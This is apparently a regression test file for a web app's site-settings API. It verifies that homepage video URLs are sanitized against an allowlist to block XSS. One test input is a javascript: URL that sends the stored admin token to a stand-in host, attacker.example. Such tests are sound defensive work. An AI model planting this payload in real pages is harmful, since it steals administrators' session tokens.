import { describe, it, expect, beforeAll, afterAll } from "vitest";
import type { AddressInfo } from "node:net";
import type { Server } from "node:http";
import { db, adminSessionsTable, pool } from "@workspace/db";
import { eq } from "drizzle-orm";
import { randomBytes } from "node:crypto";
import app from "../app.js";

// Locks in the Site Customization XSS fix for the homepage-layout surface: a
// homepage video block's videoUrl is rendered into a public <iframe src>, so
// PUT /site-settings must run every block's videoUrl through the video-host
// allowlist before persisting. Dangerous/unknown URLs become "" and known
// watch-page URLs are rewritten to their canonical embed origin.
//
// site_settings is a single global row, so this test snapshots the current
// settings, exercises the sanitizer, then restores the original layout.

let server: Server;
let baseUrl: string;
let adminToken: string;
let original: any;

interface Block {
  id: string;
  type: string;
  visible: boolean;
  source?: string;
  videoUrl?: string;
}

beforeAll(async () => {
  adminToken = randomBytes(16).toString("hex");
  await db.insert(adminSessionsTable).values({
    token: adminToken,
    username: "test-admin",
    expiresAt: new Date(Date.now() + 60 * 60 * 1000),
  });

  server = app.listen(0);
  await new Promise<void>((resolve) => server.once("listening", () => resolve()));
  const port = (server.address() as AddressInfo).port;
  baseUrl = `http://127.0.0.1:${port}`;

  const res = await fetch(`${baseUrl}/api/site-settings`);
  original = await res.json();
});

afterAll(async () => {
  // Restore the original layout so the global settings row is left untouched.
  if (original?.layout) {
    await fetch(`${baseUrl}/api/site-settings`, {
      method: "PUT",
      headers: { "content-type": "application/json", "x-admin-token": adminToken },
      body: JSON.stringify({ layout: original.layout }),
    });
  }
  if (adminToken) await db.delete(adminSessionsTable).where(eq(adminSessionsTable.token, adminToken));
  await new Promise<void>((resolve) => server.close(() => resolve()));
  await pool.end();
});

async function putBlocks(blocks: Block[]): Promise<Block[]> {
  const res = await fetch(`${baseUrl}/api/site-settings`, {
    method: "PUT",
    headers: { "content-type": "application/json", "x-admin-token": adminToken },
    body: JSON.stringify({ layout: { blocks } }),
  });
  expect(res.status).toBe(200);
  const json = (await res.json()) as { layout: { blocks: Block[] } };
  return json.layout.blocks;
}

describe("homepage layout videoUrl sanitization", () => {
  it("drops a javascript: URL in a video block to an empty string", async () => {
    const out = await putBlocks([
      {
        id: "vid",
        type: "news-card",
        visible: true,
        source: "video",
        videoUrl:
          "javascript:parent.fetch('https://attacker.example/?t='+localStorage.getItem('gp_admin_token'))",
      },
    ]);
    expect(out.find((b) => b.id === "vid")?.videoUrl).toBe("");
  });

  it("drops an arbitrary host not on the allowlist", async () => {
    const out = await putBlocks([
      { id: "vid", type: "news-card", visible: true, source: "video", videoUrl: "https://attacker.example/x" },
    ]);
    expect(out.find((b) => b.id === "vid")?.videoUrl).toBe("");
  });

  it("normalizes a YouTube watch URL to its canonical embed origin", async () => {
    const out = await putBlocks([
      {
        id: "vid",
        type: "news-card",
        visible: true,
        source: "video",
        videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      },
    ]);
    expect(out.find((b) => b.id === "vid")?.videoUrl).toBe("https://www.youtube.com/embed/dQw4w9WgXcQ");
  });
});
